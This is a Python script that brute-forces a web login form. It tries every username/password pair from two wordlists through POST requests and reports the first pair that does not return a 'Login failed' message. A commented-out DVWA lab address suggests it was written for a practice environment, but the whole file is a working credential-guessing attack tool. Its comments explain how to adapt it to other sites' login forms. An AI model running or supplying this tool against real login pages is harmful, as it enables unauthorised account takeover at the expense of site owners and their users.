import requests
import argparse

# NOTE: For the url, always use generaldomain/whateverIsSetInTheActionParameterInTheFormTag.
# ANOTHER NOTE: There are a lot of things in this script that vary from login page to login page. Ex: parameter name
# values, login failed msg, type of submit button. So a quick inspect element would be really useful beforehand


def takeOptions():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", dest="domain", help="Domain to try login on")
    parser.add_argument("-u", "--userlist", dest="userNameWordlist", help="List of usernames to try")
    parser.add_argument("-p", "--pwdlist", dest="passwordWordList", help="List of passwords to try")

    results = parser.parse_args()

    if not results.domain:
        parser.error("Enter a domain please!")
    elif not results.userNameWordlist:
        parser.error("Enter a username wordlist please!")
    elif not results.passwordWordList:
        parser.error("Enter a password wordlist please!")

    return results


# Ex: Link in browser bar, http://mywebsite.com/login
# In html however, <form action="myLogin.php" method="post">
# So in this script we set the POST url to http://mywebsite.com/myLogin.php AND NOT http://mywebsite.com/login
# Same rule applies for name and password fields along with submit button, just inspect element if not sure what to put

userOptions = takeOptions()

targetURL = userOptions.domain # "http://10.0.2.6/dvwa/login.php"  # Domain that contains the login form

uNameList = userOptions.userNameWordlist

pwdList = userOptions.passwordWordList

# The keys are the input tag names (name= parameter in HTML), and their data is the login data we want to try
# For the login/submit button, we never actually type in our own data so we need to set the data to whatever is in
# the type= parameter in the HTML for that Login button, in this case it's "submit"
# TODO: siteUsernameTagName = "username"
# TODO: sitePWDTagName = "password"
myDataDict = {"username": "", "password": "", "Login": "submit"}

with open(uNameList, "r") as unameFile:
    with open(pwdList, "r") as pwdFile:
        loginFailedMSG = "Login failed" # Something that may change so inspect element to see what failed login looks like
        for potentialUname in unameFile.readlines():
            pwdFile.seek(0) # For every new username, go back to the start of pwd file because we have iterate through them again
            potentialUname = potentialUname.strip()
            myDataDict["username"] = potentialUname # Rewrite in data dict
            for potentialPWD in pwdFile.readlines():
                potentialPWD = potentialPWD.strip()  # Stripping of whitespaces or extra chars
                myDataDict["password"] = potentialPWD  # Rewriting the data in the "password" key with a new potential pwd
                # Here, we're not sending a GET request but rather a POST request meaning we want to send data
                # We will still get a response
                response = requests.post(targetURL, myDataDict)
                if loginFailedMSG not in response.content.decode(): # If there isn't a failed login msg it means we've succeeded
                    # Notify user
                    print(f'[+] Correct Login Found!:\n[+] Username: {myDataDict["username"]}\n[+] Password: {potentialPWD}\n')
                    exit() # Exit script here don't go any further

# If nothing could be found, print this error msg:
print("[-] Reached end of wordlist and could not get a correct login, try a different username or password list?")
